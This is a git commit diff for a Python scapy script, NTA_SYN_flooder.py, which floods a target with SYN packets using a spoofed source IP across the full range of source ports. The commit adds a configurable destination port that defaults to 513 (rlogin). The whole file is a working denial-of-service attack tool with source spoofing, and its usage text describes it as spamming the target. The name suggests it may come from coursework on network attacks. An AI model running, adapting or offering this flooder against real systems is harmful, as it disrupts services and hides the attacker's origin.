baae2e5fc43b662e3843e046482277294525d861
Chase Hatch <chase.hatch.business@gmail.com>
2017-12-19 09:47:12 -0800

    Added SYN flooder, port 513 rlogin

--- NTA_SYN_flooder.py
+++ NTA_SYN_flooder.py
@@ -2,26 +2,32 @@
 from scapy.all import *
 
 
-def synFLOOD(s, t):
+def synFLOOD(s, t, d=513):
     for sport in range(1024, 65535):
         IPlayer = IP(src=s, dst=t)
-        TCPlayer = TCP(sport=sport, dport=513)
+        TCPlayer = TCP(sport=sport, dport=d)
         pkt = IPlayer / TCPlayer
         send(pkt)
-        print("S_port = %d"%(sport))
+        print("S_port = %d, D_port = %d"%(sport, d))
 
 
 def main():
-    if len(sys.argv) <> 3:
-        print("USAGE: %s %s %s" % (sys.argv[0], "[spoofed srcIP]", "[targetIP]")
+    if len(sys.argv) < 3:
+        print("USAGE: %s %s %s %s" % (sys.argv[0], "[spoofed srcIP]", "[targetIP]", "[optional: dest port; def=513]")
 )
         print("It spams the target IP with SYN packets, or it gets the availability again")
         sys.exit()
     else:
-        try:
-            synFLOOD(sys.argv[1], sys.argv[2])
-        except Exception, X:
-            print(str(X))
+        if len(sys.argv) == 4:
+            try:
+                synFLOOD(sys.argv[1], sys.argv[2], int(sys.argv[3]))
+            except Exception, X:
+                print(str(X))
+        else:
+            try:
+                synFLOOD(sys.argv[1], sys.argv[2])
+            except Exception, X:
+                print(str(X))
 
 if __name__=="__main__":
     main()
